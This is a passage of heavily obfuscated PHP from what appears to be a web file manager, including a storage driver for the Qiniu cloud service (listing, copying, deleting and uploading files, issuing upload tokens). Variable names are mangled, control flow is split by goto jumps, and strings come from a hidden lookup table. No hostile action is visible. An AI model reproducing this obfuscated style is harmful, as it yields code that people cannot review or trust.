$this->fileHistory($CäÉ°Õ±…Ş, $fì§óîĞÀ[$b¤Æ ¢Î»[419]], $fì§óîĞÀ[$b¤Æ ¢Î»[77]]); if ($e‹¬‡‹‡„³) { $CùÃœÔõ‘[$b¤Æ ¢Î»[501]][] = $fì§óîĞÀ[$b¤Æ ¢Î»[419]]; } continue; } else { if ($eğ¸µ‘×¹¡ == REPEAT_RENAME) { $fì§óîĞÀ[$b¤Æ ¢Î»[28]] = $this->fileNameAutoCache($FéŒ®ñ†§, $fì§óîĞÀ[$b¤Æ ¢Î»[28]], $eğ¸µ‘×¹¡, !1); } } } } if (!$fì§óîĞÀ[$b¤Æ ¢Î»[370]] && $fì§óîĞÀ[$b¤Æ ¢Î»[419]]) { $CùÃœÔõ‘[$b¤Æ ¢Î»[501]][] = $fì§óîĞÀ[$b¤Æ ¢Î»[419]]; } $a»Ç÷ó†Ã[] = $this->_makeItemData($fì§óîĞÀ, $D’„±ˆæÔ³, $fì§óîĞÀ[$b¤Æ ¢Î»[28]]); goto eâ«·çÕÂ®; aƒ§•æõì°: $fì§óîĞÀ[$b¤Æ ¢Î»[77]] = _get($fì§óîĞÀ, $b¤Æ ¢Î»[77], 0); $fì§óîĞÀ[$b¤Æ ¢Î»[419]] = _get($fì§óîĞÀ, $b¤Æ ¢Î»[419], 0); if (!isset($fì§óîĞÀ[$b¤Æ ¢Î»[541]]) && $fì§óîĞÀ[$b¤Æ ¢Î»[419]]) { $CùÃœÔõ‘[$b¤Æ ¢Î»[538]][] = $fì§óîĞÀ[$b¤Æ ¢Î»[419]]; } goto c‹Ü‹¾Ó“; c„¢­„¢Ï: if (isset($Fù¾©“Èš[$fì§óîĞÀ[$b¤Æ ¢Î»[28]]])) { $fì§óîĞÀ = $Fù¾©“Èš[$fì§óîĞÀ[$b¤Æ ¢Î»[28]]]; } $fì§óîĞÀ[$b¤Æ ¢Î»[370]] = $fì§óîĞÀ[$b¤Æ ¢Î»[29]] == $b¤Æ ¢Î»[76]; $fì§óîĞÀ[$b¤Æ ¢Î»[372]] = _get($fì§óîĞÀ, $b¤Æ ¢Î»[160], $b¤Æ ¢Î»[33]); goto aƒ§•æõì°; eâ«·çÕÂ®: } unset($fì§óîĞÀ); if (!empty($a»Ç÷ó†Ã)) { $this->addAll($a»Ç÷ó†Ã); } goto B½¨Š†¨ˆæ; dªá„‹ìĞ: $b¤Æ ¢Î» =& $_SERVER[îÖ]; $D’„±ˆæÔ³ = $this->sourceInfoCache($FéŒ®ñ†§); $fœª°¶Óö = $a„öãìÉÁÍ->listPath($d°„ïÏ¥ß, !1, !0); goto cÄœÌÆŒ«Á; cÄœÌÆŒ«Á: $f„ºô¸ÆÃ½ = array_merge($fœª°¶Óö[$b¤Æ ¢Î»[73]], $fœª°¶Óö[$b¤Æ ¢Î»[74]]); $Fù¾©“Èš = $this->_addFiles($a„öãìÉÁÍ, $fœª°¶Óö[$b¤Æ ¢Î»[73]], $fÛï´ï§‹ï); $a»Ç÷ó†Ã = array(); goto C¼«±¡àÕó; B½¨Š†¨ˆæ: $BÆ™š”æ‘Î = $this->_childrenList($FéŒ®ñ†§); $BÆ™š”æ‘Î = array_to_keyvalue($BÆ™š”æ‘Î, $b¤Æ ¢Î»[28]); foreach ($f„ºô¸ÆÃ½ as $fì§óîĞÀ) { $CäÉ°Õ±…Ş = $BÆ™š”æ‘Î[$fì§óîĞÀ[$b¤Æ ¢Î»[28]]]; $aÕ×«×ŠŒã = $CäÉ°Õ±…Ş[$b¤Æ ¢Î»[369]]; $this->_copyApplyMeta($CäÉ°Õ±…Ş, $CùÃœÔõ‘); if ($fì§óîĞÀ[$b¤Æ ¢Î»[29]] == $b¤Æ ¢Î»[76]) { $fì§óîĞÀ[$b¤Æ ¢Î»[75]] = $a„öãìÉÁÍ->getPathInner($fì§óîĞÀ[$b¤Æ ¢Î»[75]]); $this->_copyChildTo($a„öãìÉÁÍ, $fì§óîĞÀ[$b¤Æ ¢Î»[75]], $aÕ×«×ŠŒã, $eğ¸µ‘×¹¡, $CùÃœÔõ‘, $fÛï´ï§‹ï); } } goto F†¯îÄ†á›; F†¯îÄ†á›: } private function _addFiles($e÷‡ïÁ»ãÁ, $a²õğº±·É, $c«öª¥À…È) { goto c¬…É½µœ; c¬…É½µœ: $AõÈêÈê¦ß =& $_SERVER[îÖ]; if (!$a²õğº±·É || count($a²õğº±·É) == 0) { return array(); } $C‹çÙÑø¶ = array(); goto c¬İø¼Äâ; B½À¾Ô—Œ¯: $fáç®‹Ï¨ = array(); foreach ($a²õğº±·É as $fÈİˆ†ßóä) { if (isset($fÈİˆ†ßóä[$AõÈêÈê¦ß[541]]) && $fÈİˆ†ßóä[$AõÈêÈê¦ß[541]]) { continue; } $CÖ¸îö…ç = $e÷‡ïÁ»ãÁ->getPathInner($fÈİˆ†ßóä[$AõÈêÈê¦ß[75]]); $F¬–¡‚ˆØ„ = $D¹¿ŠÂÈËé->addFileMake($CÖ¸îö…ç, $fÈİˆ†ßóä[$AõÈêÈê¦ß[77]], $fÈİˆ†ßóä[$AõÈêÈê¦ß[164]], $fÈİˆ†ßóä[$AõÈêÈê¦ß[163]], $fÈİˆ†ßóä[$AõÈêÈê¦ß[28]], $c«öª¥À…È); $fáç®‹Ï¨[] = $F¬–¡‚ˆØ„; } $D¹¿ŠÂÈËé->addAll($fáç®‹Ï¨); goto dÍ‘‚Û°µ; c¬İø¼Äâ: foreach ($a²õğº±·É as &$D¦ï‰œ¶ßù) { goto DˆÉ†œ¼ğ¨; DˆÉ†œ¼ğ¨: Hook::trigger($AõÈêÈê¦ß[542], $D¦ï‰œ¶ßù); $D¦ï‰œ¶ßù[$AõÈêÈê¦ß[75]] = $e÷‡ïÁ»ãÁ->getPathInner($D¦ï‰œ¶ßù[$AõÈêÈê¦ß[75]]); $FÜÊë±ßÂ· = $e÷‡ïÁ»ãÁ->hashSimple($D¦ï‰œ¶ßù[$AõÈêÈê¦ß[75]]); goto B±óãêè; B±óãêè: $DßôêìË˜» = $e÷‡ïÁ»ãÁ->hashMd5($D¦ï‰œ¶ßù[$AõÈêÈê¦ß[75]]); if (strlen($DßôêìË˜») > 10 && !isset($C‹çÙÑø¶[$DßôêìË˜»])) { $C‹çÙÑø¶[$DßôêìË˜»] = array(); } $D¦ï‰œ¶ßù[$AõÈêÈê¦ß[164]] = $FÜÊë±ßÂ·; goto cèŒ¢è†Ã; EäµĞßñ”: if (count($C‹çÙÑø¶[$DßôêìË˜»]) > 1) { $D¦ï‰œ¶ßù[$AõÈêÈê¦ß[541]] = !0; } goto c¾ä©÷•Ç; cèŒ¢è†Ã: $D¦ï‰œ¶ßù[$AõÈêÈê¦ß[163]] = $DßôêìË˜»; Hook::trigger($AõÈêÈê¦ß[543], $D¦ï‰œ¶ßù); $C‹çÙÑø¶[$DßôêìË˜»][] =& $D¦ï‰œ¶ßù; goto EäµĞßñ”; c¾ä©÷•Ç: } $F¨é»Èé’ = array($AõÈêÈê¦ß[163] => array($AõÈêÈê¦ß[7], array_keys($C‹çÙÑø¶))); $D¹¿ŠÂÈËé = Model($AõÈêÈê¦ß[544]); goto B’ÉÏÊÙ½Š; FËùœ±’¤¶: foreach ($cµ¦ä…í£ as $EÛ›£àÙ‰¦) { if (!isset($C‹çÙÑø¶[$EÛ›£àÙ‰¦[$AõÈêÈê¦ß[163]]])) { continue; } $BØ¿„©©“™ =& $C‹çÙÑø¶[$EÛ›£àÙ‰¦[$AõÈêÈê¦ß[163]]]; foreach ($BØ¿„©©“™ as &$D¦ï‰œ¶ßù) { $D¦ï‰œ¶ßù[$AõÈêÈê¦ß[419]] = $EÛ›£àÙ‰¦[$AõÈêÈê¦ß[419]]; } unset($D¦ï‰œ¶ßù); } $E¯ÄãœÆÌÖ = array(); foreach ($a²õğº±·É as $E§Âêí°‚©) { $E¯ÄãœÆÌÖ[$E§Âêí°‚©[$AõÈêÈê¦ß[28]]] = $E§Âêí°‚©; } goto e¹Ä ÀçğÆ; dÍ‘‚Û°µ: $F¨é»Èé’ = array($AõÈêÈê¦ß[163] => array($AõÈêÈê¦ß[7], array_keys($C‹çÙÑø¶))); $cµ¦ä…í£ = $D¹¿ŠÂÈËé->where($F¨é»Èé’)->select(); $cµ¦ä…í£ = $cµ¦ä…í£ ? $cµ¦ä…í£ : array(); goto FËùœ±’¤¶; e¹Ä ÀçğÆ: return $E¯ÄãœÆÌÖ; goto Dó‚‰Ú²ƒ³; B’ÉÏÊÙ½Š: $cµ¦ä…í£ = $D¹¿ŠÂÈËé->where($F¨é»Èé’)->select(); $cµ¦ä…í£ = $cµ¦ä…í£ ? $cµ¦ä…í£ : array(); foreach ($cµ¦ä…í£ as $EÛ›£àÙ‰¦) { if (!isset($C‹çÙÑø¶[$EÛ›£àÙ‰¦[$AõÈêÈê¦ß[163]]])) { continue; } $eŠç³ìõˆ“ = $C‹çÙÑø¶[$EÛ›£àÙ‰¦[$AõÈêÈê¦ß[163]]]; foreach ($eŠç³ìõˆ“ as &$D¦ï‰œ¶ßù) { $D¦ï‰œ¶ßù[$AõÈêÈê¦ß[419]] = $EÛ›£àÙ‰¦[$AõÈêÈê¦ß[419]]; $D¦ï‰œ¶ßù[$AõÈêÈê¦ß[541]] = !0; } unset($D¦ï‰œ¶ßù); } goto B½À¾Ô—Œ¯; Dó‚‰Ú²ƒ³: } } define($_SERVER[îÖ][545], $_SERVER[îÖ][546]); goto Cí¦ã˜®Ğñ; BĞŠæÅ§: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($F„¸ŠÉù¢”) { parent::__construct(); require_once SDK_DIR . $_SERVER[îÖ][1206]; $this->_init($F„¸ŠÉù¢”); } public function _init($E”¤„Ò›ó) { foreach ($E”¤„Ò›ó as $fİÌÖ’šãÖ => $f·Úó„¬©) { if (isset($this->{$fİÌÖ’šãÖ})) { $this->{$fİÌÖ’šãÖ} = $f·Úó„¬©; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[îÖ][1207], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($F«‹Š†êíî, $F¿©Ñ†ñ™™ = '', $Eäœõ½÷´ï = REPEAT_RENAME) { if ($this->setContent($F«‹Š†êíî, $F¿©Ñ†ñ™™)) { return $this->getPathOuter($F«‹Š†êíî); } return !1; } public function mkdir($b¯ñªƒ›Õœ, $CÓÓÚÊ¾ºá = REPEAT_SKIP) { goto C‘òÖØëèÍ; DÀ–ÃôÃÏ‰: $b¯ñªƒ›Õœ = $b“æŒ‚µË­ . $EÒŞõ¸‰Ëù[8]; $F«í¸øæé… = get_path_this($b“æŒ‚µË­); $AŸ±ãÂ¦Œ = $b¯ñªƒ›Õœ . $F«í¸øæé…; goto c¹®Ô¢©; c¹®Ô¢©: if (!$this->mkfile($AŸ±ãÂ¦Œ)) { return !1; } if (!$this->moveFile($AŸ±ãÂ¦Œ, $b¯ñªƒ›Õœ)) { $this->delFile($AŸ±ãÂ¦Œ); return !1; } return $this->getPathOuter($b“æŒ‚µË­); goto A´çÄø˜Œ¨; C‘òÖØëèÍ: $EÒŞõ¸‰Ëù =& $_SERVER[îÖ]; $b“æŒ‚µË­ = trim($b¯ñªƒ›Õœ, $EÒŞõ¸‰Ëù[8]); if ($this->_isFolder($b“æŒ‚µË­)) { return $this->getPathOuter($b“æŒ‚µË­); } goto DÀ–ÃôÃÏ‰; A´çÄø˜Œ¨: } public function copyFile($e¦ïäÅƒòù, $bêâ“°†ñó) { $F³…‘¦å‘ó = $this->bucketManager->copy($this->bucket, $e¦ïäÅƒòù, $this->bucket, $bêâ“°†ñó, !0); return $F³…‘¦å‘ó ? !1 : $this->getPathOuter($bêâ“°†ñó); } public function moveFile($Cøè”„Ô‡, $C„Õõ¡©ãß) { $E¿ŸÚ•ÖË¿ = $this->bucketManager->move($this->bucket, $Cøè”„Ô‡, $this->bucket, $C„Õõ¡©ãß, !0); return $E¿ŸÚ•ÖË¿ ? !1 : $this->getPathOuter($C„Õõ¡©ãß); } public function delFile($Dœàœ˜Åó) { $A´±Ïçˆ¥‰ = $this->bucketManager->delete($this->bucket, $Dœàœ˜Åó); return $A´±Ïçˆ¥‰ ? !1 : !0; } public function delFolder($F¾¶ª³ˆ) { $AöàÜŠ·ä = $this->fileList($F¾¶ª³ˆ); if (empty($AöàÜŠ·ä)) { return !0; } $dâªŞ¡Õ½’ = 1000; if (count($AöàÜŠ·ä) <= $dâªŞ¡Õ½’) { return $this->qnDelObj($AöàÜŠ·ä) ? !1 : !0; } foreach (array_chunk($AöàÜŠ·ä, $dâªŞ¡Õ½’) as $fÄŞ³¬ù¤¤) { $FÂçŸ‹Ì¶ô = $this->qnDelObj($fÄŞ³¬ù¤¤); if ($FÂçŸ‹Ì¶ô) { return !1; } } return !0; } private function qnDelObj($AÁ×éæ–Õ²) { $C™ãÉ¯‹ˆ = $this->bucketManager->buildBatchDelete($this->bucket, $AÁ×éæ–Õ²); list($f¿‰¨™·Ä, $FÌ£Õø•­²) = $this->bucketManager->batch($C™ãÉ¯‹ˆ); return $FÌ£Õø•­²; } private function fileList($cëÖÇßœêì, $Fô•†ƒÇËš = 0) { goto BòŸ¿éÚ¢ª; BòŸ¿éÚ¢ª: $cõÛÄ™É‡Î =& $_SERVER[îÖ]; $cëÖÇßœêì = trim($cëÖÇßœêì, $cõÛÄ™É‡Î[8]); $CÁñ³¬­˜­ = empty($cëÖÇßœêì) ? $cõÛÄ™É‡Î[33] : $cëÖÇßœêì . $cõÛÄ™É‡Î[8]; goto E¥…ß³ƒ›Ó; d¥ÓÓÄ‡Æ‰: $D¥ºÕˆŒ‹ = array(); while (!0) { list($e‡™Ä¢’ò, $F„„ğËøÙ) = $this->bucketManager->listFiles($this->bucket, $CÁñ³¬­˜­, $f±¡†Áâßì, $b”œ‡ÊÚóç, $f½³×‘Îê); if ($F„„ğËøÙ) { return !1; } $f±¡†Áâßì = array_key_exists($cõÛÄ™É‡Î[1177], $e‡™Ä¢’ò) ? $f±¡†Áâßì = $e‡™Ä¢’ò[$cõÛÄ™É‡Î[1208]] : $cõÛÄ™É‡Î[33]; foreach ($e‡™Ä¢’ò[$cõÛÄ™É‡Î[1209]] as $cèÉä‚²‚ì) { $DÌáË’‰À¯ = $cèÉä‚²‚ì[$cõÛÄ™É‡Î[89]]; if ($Fô•†ƒÇËš) { $DÌáË’‰À¯ = array($cõÛÄ™É‡Î[28] => $DÌáË’‰À¯, $cõÛÄ™É‡Î[77] => $cèÉä‚²‚ì[$cõÛÄ™É‡Î[1210]]); } $D¥ºÕˆŒ‹[] = $DÌáË’‰À¯; } if ($f±¡†Áâßì == $cõÛÄ™É‡Î[33]) { break; } } return $D¥ºÕˆŒ‹; goto e£¨Ó¼ÖŠ¶; E¥…ß³ƒ›Ó: $f±¡†Áâßì = $cõÛÄ™É‡Î[33]; $b”œ‡ÊÚóç = 1000; $f½³×‘Îê = $cõÛÄ™É‡Î[33]; goto d¥ÓÓÄ‡Æ‰; e£¨Ó¼ÖŠ¶: } public function rename($F­ã‘Á¸Èò, $CìÙ¯†‰Ç—) { return $this->renameObject($F­ã‘Á¸Èò, $CìÙ¯†‰Ç—); } public function fileInfo($Aæ‚²“Ô®, $b˜•ƒ¤ÖÎ = false, $E±ŠïØµ› = array()) { goto E÷¨ÎÌ¸¯–; E÷¨ÎÌ¸¯–: $Dğ«Šéø–± =& $_SERVER[îÖ]; if ($b˜•ƒ¤ÖÎ) { return array($Dğ«Šéø–±[28] => $this->pathThis($Aæ‚²“Ô®), $Dğ«Šéø–±[75] => $this->getPathOuter($Dğ«Šéø–±[8] . $Aæ‚²“Ô®), $Dğ«Šéø–±[29] => $Dğ«Šéø–±[167], $Dğ«Šéø–±[77] => isset($E±ŠïØµ›[$Dğ«Šéø–±[1210]]) ? $E±ŠïØµ›[$Dğ«Šéø–±[1210]] : 0, $Dğ«Šéø–±[160] => $this->ext($Aæ‚²“Ô®)); } $béµšèĞ»« = array($Dğ«Šéø–±[28] => $this->pathThis($Aæ‚²“Ô®), $Dğ«Šéø–±[75] => $this->getPathOuter($Dğ«Šéø–±[8] . $Aæ‚²“Ô®), $Dğ«Šéø–±[29] => $Dğ«Šéø–±[167], $Dğ«Šéø–±[187] => 0, $Dğ«Šéø–±[107] => 0, $Dğ«Šéø–±[77] => 0, $Dğ«Šéø–±[160] => $this->ext($Aæ‚²“Ô®), $Dğ«Šéø–±[188] => !0, $Dğ«Šéø–±[189] => !0); goto dô¦Ï†„ß†; A²œ¶å¥ƒ•: return $béµšèĞ»«; goto a“Ø²¯†Îö; dô¦Ï†„ß†: if (empty($E±ŠïØµ›)) { $E±ŠïØµ› = $this->objectMeta($Aæ‚²“Ô®); if (!$E±ŠïØµ›) { return $béµšèĞ»«; } } if (isset($E±ŠïØµ›[$Dğ«Šéø–±[1211]])) { $béµšèĞ»«[$Dğ«Šéø–±[107]] = substr($E±ŠïØµ›[$Dğ«Šéø–±[1211]] . $Dğ«Šéø–±[33], 0, 10); } if (isset($E±ŠïØµ›[$Dğ«Šéø–±[1210]])) { $béµšèĞ»«[$Dğ«Šéø–±[77]] = $E±ŠïØµ›[$Dğ«Šéø–±[1210]]; } goto A²œ¶å¥ƒ•; a“Ø²¯†Îö: } public function folderInfo($CÀøî¨šÈ¼, $a·„³åô°ô = false) { goto eˆ‰„ìö; D‡éºÆ›’Ö: $CÀøî¨šÈ¼ = rtrim($CÀøî¨šÈ¼, $a¬ËøğÆ°Ó[8]) . $a¬ËøğÆ°Ó[8]; $c†éâƒÔË… = $this->objectMeta($CÀøî¨šÈ¼); if (isset($c†éâƒÔË…[$a¬ËøğÆ°Ó[1211]])) { $cËÀ‡¹¢‰ò[$a¬ËøğÆ°Ó[107]] = substr($c†éâƒÔË…[$a¬ËøğÆ°Ó[1211]] . $a¬ËøğÆ°Ó[33], 0, 10); } goto a‘ì†ã…çŠ; eˆ‰„ìö: $a¬ËøğÆ°Ó =& $_SERVER[îÖ]; if ($a·„³åô°ô) { return array($a¬ËøğÆ°Ó[28] => $this->pathThis($CÀøî¨šÈ¼), $a¬ËøğÆ°Ó[75] => $this->getPathOuter($a¬ËøğÆ°Ó[8] . $CÀøî¨šÈ¼), $a¬ËøğÆ°Ó[29] => $a¬ËøğÆ°Ó[76]); } $cËÀ‡¹¢‰ò = array($a¬ËøğÆ°Ó[28] => $this->pathThis($CÀøî¨šÈ¼), $a¬ËøğÆ°Ó[75] => $this->getPathOuter($a¬ËøğÆ°Ó[8] . $CÀøî¨šÈ¼), $a¬ËøğÆ°Ó[29] => $a¬ËøğÆ°Ó[76], $a¬ËøğÆ°Ó[187] => 0, $a¬ËøğÆ°Ó[107] => 0, $a¬ËøğÆ°Ó[1156] => !0, $a¬ËøğÆ°Ó[1157] => !0); goto D‡éºÆ›’Ö; a‘ì†ã…çŠ: return $cËÀ‡¹¢‰ò; goto fÎøÖôË¦‘; fÎøÖôË¦‘: } public function listPath($DèùŞâíÏ©, $dŞÕÉ±‹¬È = false) { goto fÊëÂ¬º´¾; fõ®Ú²Š›‚: $e˜âà×ÅÅ = $Aáƒ¾¨×­˜ = array(); while (!0) { list($e‡¥‰ô‚Ş­, $eÊ¨™œª¤Î) = $this->bucketManager->listFiles($this->bucket, $b¶î†ÁÍ„ó, $A–·’«Ìïƒ, $fÅŒ©î´»‰, $DÌÓ·ì‰§Š); if ($eÊ¨™œª¤Î) { return !1; } $A–·’«Ìïƒ = array_key_exists($Bİ¾Ù±ñä‰[1177], $e‡¥‰ô‚Ş­) ? $A–·’«Ìïƒ = $e‡¥‰ô‚Ş­[$Bİ¾Ù±ñä‰[1208]] : $Bİ¾Ù±ñä‰[33]; if (isset($e‡¥‰ô‚Ş­[$Bİ¾Ù±ñä‰[1212]])) { foreach ($e‡¥‰ô‚Ş­[$Bİ¾Ù±ñä‰[1212]] as $C°¶œÒÀ°ê) { if ($C°¶œÒÀ°ê == $b¶î†ÁÍ„ó) { continue; } $e˜âà×ÅÅ[] = $this->folderInfo($C°¶œÒÀ°ê, $dŞÕÉ±‹¬È); } } if (isset($e‡¥‰ô‚Ş­[$Bİ¾Ù±ñä‰[1209]])) { foreach ($e‡¥‰ô‚Ş­[$Bİ¾Ù±ñä‰[1209]] as $A•‰£ĞÕ˜Ä) { if ($A•‰£ĞÕ˜Ä[$Bİ¾Ù±ñä‰[89]] == $b¶î†ÁÍ„ó) { continue; } $Aáƒ¾¨×­˜[] = $this->fileInfo($A•‰£ĞÕ˜Ä[$Bİ¾Ù±ñä‰[89]], $dŞÕÉ±‹¬È, $A•‰£ĞÕ˜Ä); } } if ($A–·’«Ìïƒ == $Bİ¾Ù±ñä‰[33]) { break; } } return array($Bİ¾Ù±ñä‰[74] => $e˜âà×ÅÅ, $Bİ¾Ù±ñä‰[73] => $Aáƒ¾¨×­˜); goto D²ÊÎ¿º í; fÊëÂ¬º´¾: $Bİ¾Ù±ñä‰ =& $_SERVER[îÖ]; $DèùŞâíÏ© = trim($DèùŞâíÏ©, $Bİ¾Ù±ñä‰[8]); $b¶î†ÁÍ„ó = empty($DèùŞâíÏ©) ? $Bİ¾Ù±ñä‰[33] : $DèùŞâíÏ© . $Bİ¾Ù±ñä‰[8]; goto d‘‡ç‘¹; d‘‡ç‘¹: $A–·’«Ìïƒ = $Bİ¾Ù±ñä‰[33]; $fÅŒ©î´»‰ = 1000; $DÌÓ·ì‰§Š = $Bİ¾Ù±ñä‰[8]; goto fõ®Ú²Š›‚; D²ÊÎ¿º í: } public function has($eƒŞİàÙá, $fĞ×•ß¡µœ = false, $f·òßø©Æ³ = true) { goto FçÓ–ÛÀÁ„; FçÓ–ÛÀÁ„: $d‹ø±¥˜Ÿ =& $_SERVER[îÖ]; $eƒŞİàÙá = trim($eƒŞİàÙá, $d‹ø±¥˜Ÿ[8]); $d»Á”§äÛ = empty($eƒŞİàÙá) ? $d‹ø±¥˜Ÿ[33] : $eƒŞİàÙá . $d‹ø±¥˜Ÿ[8]; goto bÄé³ˆ“î; bÄé³ˆ“î: $D‘œ½¿Ç…¡ = $d‹ø±¥˜Ÿ[33]; $bö¸Œ“îß¿ = 1000; $a‹°×¬òØ = $d‹ø±¥˜Ÿ[8]; goto f’£ÂĞäâ; f’£ÂĞäâ: $dŞóºº‚Ä» = 0; $eñ¬ßöÍ = 0; while (!0) { list($dÖğßó¤¿à, $fÛƒ…ÀÄ‘Ü) = $this->bucketManager->listFiles($this->bucket, $d»Á”§äÛ, $D‘œ½¿Ç…¡, $bö¸Œ“îß¿, $a‹°×¬òØ); if ($fÛƒ…ÀÄ‘Ü) { return !1; } $D‘œ½¿Ç…¡ = array_key_exists($d‹ø±¥˜Ÿ[1177], $dÖğßó¤¿à) ? $D‘œ½¿Ç…¡ = $dÖğßó¤¿à[$d‹ø±¥˜Ÿ[1208]] : $d‹ø±¥˜Ÿ[33]; if ($fĞ×•ß¡µœ) { if (!empty($dÖğßó¤¿à[$d‹ø±¥˜Ÿ[1209]])) { $dŞóºº‚Ä» += count($dÖğßó¤¿à[$d‹ø±¥˜Ÿ[1209]]); } if (!empty($dÖğßó¤¿à[$d‹ø±¥˜Ÿ[1212]])) { $eñ¬ßöÍ += count($dÖğßó¤¿à[$d‹ø±¥˜Ÿ[1212]]); } if ($D‘œ½¿Ç…¡ === $d‹ø±¥˜Ÿ[33]) { break; } continue; } if ($f·òßø©Æ³) { if (!empty($dÖğßó¤¿à[$d‹ø±¥˜Ÿ[1209]])) { return !0; } } else { if (!empty($dÖğßó¤¿à[$d‹ø±¥˜Ÿ[1212]])) { return !0; } } if ($D‘œ½¿Ç…¡ == $d‹ø±¥˜Ÿ[33]) { break; } } goto F§‚æÇÆÊé; F§‚æÇÆÊé: if ($fĞ×•ß¡µœ) { return array($d‹ø±¥˜Ÿ[191] => $dŞóºº‚Ä», $d‹ø±¥˜Ÿ[192] => $eñ¬ßöÍ); } return !1; goto c‘ˆ¯–†ƒ; c‘ˆ¯–†ƒ: } public function listAll($C­ÔÃÔ“–¨) { $E¥ˆ°Ô¡„ =& $_SERVER[îÖ]; $eÑ›•ÛÃŠĞ = $this->fileList($C­ÔÃÔ“–¨, 1); $F¶ß¬¤ø„¬ = array(); foreach ($eÑ›•ÛÃŠĞ as $CÚ†Í«‹Ç) { $F¶ß¬¤ø„¬[$CÚ†Í«‹Ç[$E¥ˆ°Ô¡„[28]]] = $CÚ†Í«‹Ç[$E¥ˆ°Ô¡„[77]]; } return $this->listAllFiles($C­ÔÃÔ“–¨, array_keys($F¶ß¬¤ø„¬), $F¶ß¬¤ø„¬); } public function canRead($dä‹±Å†•) { return $this->exist($dä‹±Å†•) ? !0 : !1; } public function canWrite($D„Àß‰Ğˆ) { return $this->exist($D„Àß‰Ğˆ) ? !0 : !1; } public function getContent($E˜åÉïíÓñ) { return $this->fileSubstr($E˜åÉïíÓñ, 0, -1); } public function setContent($F…¢ƒ×£­½, $b‡Ë‚²È½ = '') { $F§„ÌÃÒª = $this->tempFile($this->pathThis($F…¢ƒ×£­½)); file_put_contents($F§„ÌÃÒª, $b‡Ë‚²È½); if ($this->upload($F…¢ƒ×£­½, $F§„ÌÃÒª)) { $this->tempFileRemve($F§„ÌÃÒª); return !0; } return !1; } public function refreshUrls($dî¶¹»ÁÚ) { goto FôÔ¬Àæè; FôÔ¬Àæè: $a„‹š¢†Šª =& $_SERVER[îÖ]; $fóğ„…ÏÄÀ = array(); if (is_array($dî¶¹»ÁÚ)) { foreach ($dî¶¹»ÁÚ as $eôó¼œ„éé) { $fóğ„…ÏÄÀ[] = $this->link($eôó¼œ„éé); } } else { $fóğ„…ÏÄÀ[] = $this->link($dî¶¹»ÁÚ); } goto Dœ±ØÅÎæ; Dœ±ØÅÎæ: $D‚¹ÚîÙÆ’ = new Qiniu\Cdn\CdnManager($this->auth); list($e·À”±£——, $D¤ãİóãà¸) = $D‚¹ÚîÙÆ’->refreshUrls($fóğ„…ÏÄÀ); if ($D¤ãİóãà¸) { return !1; } goto Bí²ñŒ‰·ó; Bí²ñŒ‰·ó: return $e·À”±£——[$a„‹š¢†Šª[1213]] == $a„‹š¢†Šª[695] ? !0 : !1; goto E¶É†·Ğ¾œ; E¶É†·Ğ¾œ: } public function fileSubstr($AÓó¶¥¡ù¥, $e¹±ë‹Ôğ, $bé±Ûíâ ¿) { $FËÂ¤æ©‚˜ =& $_SERVER[îÖ]; if (!($E“ŞîãçÅé = $this->link($AÓó¶¥¡ù¥))) { return !1; } $aÍ‹Ó¾øŒ½ = !1; if ($bé±Ûíâ ¿ > 0) { $Eâ¸Ö¿ğïÁ = $e¹±ë‹Ôğ + $bé±Ûíâ ¿ - 1; $aÍ‹Ó¾øŒ½ = array($FËÂ¤æ©‚˜[1214] . $e¹±ë‹Ôğ . $FËÂ¤æ©‚˜[412] . $Eâ¸Ö¿ğïÁ); } $Bó‚°ßÏ = url_request($E“ŞîãçÅé, $FËÂ¤æ©‚˜[216], !1, $aÍ‹Ó¾øŒ½); return $Bó‚°ßÏ[$FËÂ¤æ©‚˜[688]] ? $Bó‚°ßÏ[$FËÂ¤æ©‚˜[1028]] : !1; } public function upload($f®‹Êõ¿, $a™ò‚ö×„Ÿ, $F¤Ø‘°Ïíµ = false, $b‹‰³ö±®İ = REPEAT_REPLACE) { $CØÏšÄÑ³Ú = new Qiniu\Storage\UploadManager(); $BÆïªìÚ¹Ù = $this->auth->uploadToken($this->bucket, $f®‹Êõ¿); $b¾äÖ¾ĞÖƒ = get_file_mime(get_path_ext($a™ò‚ö×„Ÿ)); list($bŠåÕƒØ¸¼, $AŸÀòäÛâ) = $CØÏšÄÑ³Ú->putFile($BÆïªìÚ¹Ù, $f®‹Êõ¿, $a™ò‚ö×„Ÿ, null, $b¾äÖ¾ĞÖƒ); return $AŸÀòäÛâ ? !1 : $this->getPathOuter($f®‹Êõ¿); } public function uploadFormData($b°âÜö ËÜ, $Aê¶‘¢³ö = 3600) { return $this->uploadToken($b°âÜö ËÜ, $Aê¶‘¢³ö); } public function multiUploadFormData($C‡éõ £ĞŠ, $EàŒàéÎ = 3600) { return $this->uploadToken($C‡éõ £ĞŠ, $EàŒàéÎ); } private function uploadToken($E†ë‘‘¶¡, $D§ê§Ê = 3600) { goto fœ°™ßâœÑ; d¶Òø—ê…: $fŞŠİÊ¬´¥ = http_type() . "\72\x2f\x2f\165\160\154\x6f\x61\x64{$fîœ·ÇÇŒ¡}\x2e\x71\151\x6e\x69\165\160\56\x63\x6f\155\57"; return array($CÎóŞø¸˜ö[1218] => $a¾Ö‹‘Ğ¬È, $CÎóŞø¸˜ö[1219] => $fŞŠİÊ¬´¥); goto Dœß’Ï•°é; fœ°™ßâœÑ: $CÎóŞø¸˜ö =& $_SERVER[îÖ]; $cÌÉÔšƒ™† = $D§ê§Ê; $dìÔƒÂ®ä‘ = array($CÎóŞø¸˜ö[1215] => $CÎóŞø¸˜ö[1216]); goto AŒÁ¿ÙÙ…¡; AŒÁ¿ÙÙ…¡: $AÖ“©ƒ¯× = null; $a¾Ö‹‘Ğ¬È = $this->auth->uploadToken($this->bucket, $AÖ“©ƒ¯×, $cÌÉÔšƒ™†, $dìÔƒÂ®ä‘, !0); $fîœ·ÇÇŒ¡ = empty($this->region) || $this->region == $CÎóŞø¸˜ö[1217] 